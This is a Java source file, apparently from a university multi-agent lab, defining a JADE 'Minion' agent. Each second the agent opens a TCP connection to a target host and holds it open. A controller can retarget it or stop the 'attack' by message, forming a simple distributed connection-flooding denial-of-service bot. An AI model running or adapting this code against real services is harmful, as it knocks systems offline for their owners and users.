package lab4;

import java.io.IOException;
import java.net.Socket;

import jade.core.Agent;
import jade.core.behaviours.TickerBehaviour;
import jade.domain.DFService;
import jade.domain.FIPAException;
import jade.domain.FIPAAgentManagement.DFAgentDescription;
import jade.domain.FIPAAgentManagement.ServiceDescription;
import jade.lang.acl.ACLMessage;

public class Minion extends Agent{
	BehaviourOpenTCPConnection tcpb;
    protected void setup() {    	
        System.out.println("Hello World! My name is " + getAID().getLocalName());
        BehaviourReceiveMessage rm = new BehaviourReceiveMessage(this, 100);
        //addBehaviour(rm);
        tcpb = new BehaviourOpenTCPConnection(this, 1000, "TeamWhateverLB-1369488506.eu-west-1.elb.amazonaws.com", 2223);
        addBehaviour(tcpb);
    }

	/** 
	 * Registration with the DF 
	 */
    protected void registerAgent(){
	    DFAgentDescription dfd = new DFAgentDescription();
	    ServiceDescription sd = new ServiceDescription();
	    sd.setType("minion");
	    sd.setName(getName());
	    sd.addOntologies("minion");
	    dfd.setName(getAID());
	    dfd.addServices(sd);
	    try {
	    	DFService.register(this,dfd);
	    } catch (FIPAException e) {
	        System.err.println(getLocalName()+" registration with DF unsucceeded. Reason: "+e.getMessage());
	        doDelete();
	    }
    }
    /**
     * if agent is stopped
     */
    protected void takeDown(){
    	tcpb.onEnd(); // close connections
    }
    
    /**
     * What to do on the receival of a message
     * @author nitzel
     *
     */
    protected class BehaviourReceiveMessage extends TickerBehaviour {
		public BehaviourReceiveMessage(Agent agent, long period) {
			super(agent, period);
		}

		@Override
		protected void onTick() {
			// TODO Auto-generated method stub

            //Receive a Message
            ACLMessage msg = receive();
            if(msg != null) {
            	int performative = msg.getPerformative();
            	String content = msg.getContent();
            	
            	switch(performative){
            	case ACLMessage.PROPAGATE: // received new target
            		String[] target = content.split(":");
            		if(target.length != 2){
            			System.err.println("Minion received invalid target `"+content+"`");
            		}
            		try {
						tcpb.setTarget(target[0], Integer.parseInt(target[1]));
						//tcpb.restart();
					} catch (NumberFormatException e) {
						System.err.println("Minion can't parse port: `"+target[1]+"`");
					}
            		break;
            	case ACLMessage.CANCEL: // stop attack, delete agent
            		getAgent().doDelete();
            		break;
            	default:
            		System.err.println("Minion received unkown performative:"+performative+"/content"+content);
            	}
            }
		}
    }
    /**
     * Opens a tcp connection :)
     * Is runnable to be non-blocking
     * @author nitzel
     *
     */
    protected class BehaviourOpenTCPConnection extends TickerBehaviour implements Runnable{
    	String target;
    	int targetPort;
    	java.util.Vector<Socket> sockets;
    	public BehaviourOpenTCPConnection(Agent agent, long period, String target, int targetPort) {
			super(agent, period);
			sockets = new java.util.Vector<>();
			this.setTarget(target, targetPort);
		}
    	
    	public void setTarget(String target, int targetPort){
    		this.onEnd(); // clear all connections
			this.target = target;
			this.targetPort = targetPort;
    	}
    	
		@Override
		protected void onTick() {
			System.out.println("ticking minion");
			new Thread(this).start();
		}

		@Override
		public void run() {
    		// TODO open TCP Connection
			try {
				Socket s = new Socket(target, targetPort);
				sockets.add(s);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		@Override
		public int onEnd(){
			System.out.println("ending minions ticker behaviour");
			for(Socket s : sockets){
				try {
					s.close();
				} catch (IOException e) {}
			}
			return targetPort;
		}
    }
}
